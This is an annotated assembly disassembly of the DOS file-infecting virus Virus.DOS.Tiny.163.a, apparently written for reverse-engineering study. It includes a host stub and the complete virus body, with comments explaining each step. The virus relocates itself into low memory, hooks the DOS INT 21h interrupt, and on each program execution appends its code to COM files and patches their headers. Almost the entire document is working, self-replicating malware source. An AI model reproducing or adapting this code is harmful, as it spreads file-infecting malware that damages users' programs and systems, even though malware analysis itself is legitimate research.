; Disassembly of `Virus.DOS.Tiny.163.a`.
;
; Source: COM file (MD5: 464e8d72ca144494d97b42ede477c8a8).
;
; This virus belongs to the `Tiny Family` family, not `Tiny Virus`, although VSUM doesn't list a 163 bytes
; long version.

            org 100h

; After boot, this memory area (256 bytes) is not used.
; See http://oopweb.com/Assembly/Documents/InterList/Volume/MEMORY.LST.
;
k_unused_memory_segment: equ 0x60

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; HOST
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

host:
            dec bp
jmp_to_entry_point:
            jmp word entry_point
jmp_to_entry_point_address: equ $-2
string_start: equ $-1
            db "ello - This is a 100   COM test file, 1993", 0Ah, 0Dh
            db 24h, 1Ah
            times 41 db 41h

print_string:
            mov ah,9                          ; print to stdout
            mov dx,string_start
            int 21h
            int 20h

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; VIRUS
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

virus_start:
            dec bp                            ; this is a copy of the header; it's not directly executed,
            jmp word $+(entry_point-jmp_to_entry_point) ; so ignore it.
virus_start_jmp_address: equ $-2

entry_point:
copy_in_memory:
            mov bx,[jmp_to_entry_point_address]
            mov cx,k_unused_memory_segment
            mov es,cx
            xor di,di
            lea si,[bx+100h]                  ; virus_start; 100h = virus_start - (entry_point-(jmp_to_entry_point+2))
                                              ; BX contains file offset, +100h converts to CS offset
            mov cl,virus_end - virus_start
            cld
            rep movsb
            pop ds                            ; 0 on COM execution
            push ds
            mov si,21h*4                      ; int 21 (offset)
            cmp byte [si+2],k_unused_memory_segment ; int 21 (segment)
            jz short return_to_host

hijack_int_21:
            mov di,v_addr_original_int21 - virus_start
            mov cl,2
            rep movsw
            cli
            mov word [si-4],new_int21 - virus_start
            mov [si-2],es
            sti

return_to_host:
            push cs
            push cs
            pop ds
            pop es
            mov di,100h
            push di
            lea si,[bx+100h + host_original_header - virus_start]
            mov cl,2
            rep movsw
            ret

new_int21:
            cmp ah,4Bh                        ; execution?
            jnz short return_to_original_int21

            push ax
            push bx
            push dx
            push cx
            push ds

            mov ax,3D92h                      ; open for r/w, deny-write sharing mode, no inherit
                                              ; DX points to filename from intercepted INT 21h/4Bh call
            int 21h
            mov bx,ax
            call word move_to_file_start
            mov ah,3Fh                        ; read header
            mov cl,4
            push cs
            pop ds
            mov dx,host_original_header-virus_start
            int 21h

            cmp byte [host_original_header-virus_start], 'M' ; is it an EXE file?
            jz short close_file
            mov al,2
            call word move_file_pointer_partial_call ; ah=42h set by callee, al=2 (ax=4202h) - move to file end
            mov [virus_start_jmp_address - virus_start],ax
            mov cx,virus_end - virus_start
            call word write_to_file
            call word move_to_file_start
            mov cl,4
            call word write_to_file

close_file:
            mov ah,3Eh                        ; close file
            int 21h
            pop ds
            pop cx
            pop dx
            pop bx
            pop ax

return_to_original_int21:
            jmp word 000Bh:40EBh
v_addr_original_int21: equ $-4

write_to_file:
            mov ah,40h
            jmp word int21_partial_call

move_to_file_start:
            xor al,al                         ; 4200h: go to start of file

move_file_pointer_partial_call:
            xor cx,cx
            mov ah,42h

int21_partial_call:
            xor dx,dx                         ; ensures writes start from DS:0
            int 21h
            ret

host_original_header:
            jmp short $+(print_string-host)
            nop
            db 'H'                            ; part of the 'Hello...' string

virus_end: equ $
